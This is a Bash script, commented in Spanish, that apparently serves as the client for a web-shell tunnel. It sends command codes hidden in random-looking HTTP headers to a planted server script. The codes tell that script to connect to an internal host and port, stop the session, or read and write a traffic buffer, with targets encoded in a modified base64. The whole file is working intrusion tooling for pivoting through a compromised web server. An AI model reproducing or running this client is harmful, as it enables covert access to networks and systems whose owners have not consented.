#!/bin/bash

# Descripción de las Funciones

# show_menu: Muestra las opciones de comandos disponibles.
# read_url_and_command: Solicita la URL del servidor y muestra el menú de comandos.
# send_b5v9XJbF: Envía el comando b5v9XJbF para conectar a un servidor remoto.
# send_0FX: Envía el comando 0FX para detener la comunicación.
# send_TQDLLDvYzyrB4pPbieRBk90FIdYgjJcE2si70wIXfql: Envía el comando TQDLLDvYzyrB4pPbieRBk90FIdYgjJcE2si70wIXfql para leer datos del buffer.
# send_CtWP7tBSKiDnysT9hP9pa: Envía el comando CtWP7tBSKiDnysT9hP9pa para enviar datos al buffer.

# Función para mostrar el menú y leer la opción del usuario
function show_menu() {
    echo "Seleccione el comando a ejecutar:"
    echo "1) b5v9XJbF: Conectar a un servidor remoto"
    echo "2) 0FX: Detener la comunicación"
    echo "3) TQDLLDvYzyrB4pPbieRBk90FIdYgjJcE2si70wIXfql: Leer datos del buffer"
    echo "4) CtWP7tBSKiDnysT9hP9pa: Enviar datos al buffer"
    echo -n "Ingrese el número del comando: "
    read option
}

# Función para leer la URL y el comando
function read_url_and_command() {
    echo -n "Ingrese la URL del servidor (ejemplo: http://localhost/script.php): "
    read url
    show_menu
}

# Función para enviar el comando b5v9XJbF
function send_b5v9XJbF() {
    echo -n "Ingrese la dirección y el puerto (ejemplo: 127.0.0.1|80): "
    read target_port
    encoded_target=$(echo -n "$target_port" | base64)
    curl -X GET "$url" -H "Ffydhndmhhl: b5v9XJbF$(head -c 22 /dev/urandom | base64 | tr -d '/+=' | cut -c 1-22)" -H "Nnpo: $(echo -n "$encoded_target" | tr '/+' 'CE')" 
}

# Función para enviar el comando 0FX
function send_0FX() {
    curl -X GET "$url" -H "Ffydhndmhhl: 0FX"
}

# Función para enviar el comando TQDLLDvYzyrB4pPbieRBk90FIdYgjJcE2si70wIXfql
function send_TQDLLDvYzyrB4pPbieRBk90FIdYgjJcE2si70wIXfql() {
    curl -X GET "$url" -H "Ffydhndmhhl: TQDLLDvYzyrB4pPbieRBk90FIdYgjJcE2si70wIXfql"
}

# Función para enviar el comando CtWP7tBSKiDnysT9hP9pa
function send_CtWP7tBSKiDnysT9hP9pa() {
    echo -n "Ingrese los datos a enviar (base64 codificado): "
    read data
    encoded_data=$(echo -n "$data" | tr 'CE' '/+' | base64)
    curl -X POST "$url" -H "Ffydhndmhhl: CtWP7tBSKiDnysT9hP9pa" -H "Content-Type: application/octet-stream" --data-binary "$encoded_data"
}

# Ejecutar el script
read_url_and_command

case $option in
    1)
        send_b5v9XJbF
        ;;
    2)
        send_0FX
        ;;
    3)
        send_TQDLLDvYzyrB4pPbieRBk90FIdYgjJcE2si70wIXfql
        ;;
    4)
        send_CtWP7tBSKiDnysT9hP9pa
        ;;
    *)
        echo "Opción no válida"
        ;;
esac
